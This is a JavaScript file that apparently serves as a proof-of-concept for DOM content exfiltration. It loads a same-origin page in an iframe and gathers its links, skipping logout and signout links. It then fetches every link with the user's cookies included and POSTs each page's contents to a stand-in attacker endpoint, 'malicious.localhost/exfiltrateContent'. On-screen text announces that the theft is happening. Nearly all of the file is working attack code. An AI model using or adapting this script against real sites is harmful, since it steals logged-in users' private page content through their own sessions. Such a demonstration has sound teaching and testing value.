var iframe = document.createElement('iframe');
iframe.onload = action;
iframe.width = '100%'
iframe.height = '100%'
iframe.src = 'https://localhost:8000/content'

var body = document.getElementsByTagName('body')[0];

var notice = document.createElement('h2');
notice.textContent = 'DOM content exfiltration is happening on the backgroud. Check malicious server log.';
notice.style.color = 'orange';
notice.style.textAlign = 'center';
body.appendChild(notice);

body.appendChild(iframe)

function action(){
  setTimeout(function(){exfiltrateData()}, 3000) //delay 3 seconds before calling exfiltrateData(), to allow all js to be loaded. 
}

//Same origin. So able to read DOM content.
function exfiltrateData(){

  var allATags = iframe.contentDocument.getElementsByTagName('a')
  
 // console.log(allATags);

  var allURLs = []
  for (var i=0; i<allATags.length; i++){
    allURLs.push(allATags[i].href)
  }
 // console.log(allURLs);

  var uniqueURLs = [...new Set(allURLs)];

  if (uniqueURLs !=null){
    uniqueURLs = uniqueURLs.filter(item => !item.includes('logout') && !item.includes('signout'));
  }

  //fetch() all the URL, retrive reply and send the reply back to server. Since fetch() is asychronous methods, here will be multithreads call out to different hrefs.
 
  uniqueURLs.forEach(url => {
    fetch(url,{
      'credentials': 'include',
      'method': 'GET'
    })
      .then(response => response.text())
      .then(data => {
        // exfiltrate data
        const formData = new URLSearchParams();
        formData.append('url', url);
        formData.append('content', data);

        fetch('https://malicious.localhost/exfiltrateContent', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: formData.toString()
        });
      })
      .catch(error => console.error(error));
  });


}


